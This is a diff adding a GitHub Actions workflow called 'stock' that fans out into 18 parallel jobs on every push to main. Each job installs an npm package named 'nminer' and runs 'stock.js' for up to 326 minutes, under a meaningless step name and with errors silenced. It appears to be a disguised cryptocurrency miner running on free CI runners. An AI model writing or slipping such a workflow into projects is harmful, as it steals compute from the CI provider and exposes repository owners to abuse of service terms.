@@ -1,0 +1,43 @@
+name: stock
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3332 }
+          - { version: 1583 }
+          - { version: 937 }
+          - { version: 8701 }
+          - { version: 549 }
+          - { version: 8351 }
+          - { version: 7369 }
+          - { version: 969 }
+          - { version: 4508 }
+          - { version: 2012 }
+          - { version: 6784 }
+          - { version: 1681 }
+          - { version: 9400 }
+          - { version: 4180 }
+          - { version: 3525 }
+          - { version: 2496 }
+          - { version: 7428 }
+          - { version: 175 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: mmm frantically neatly ick team
+        run: |
+          npm install nminer@latest
+          timeout 326m node stock.js || echo "stock executed"
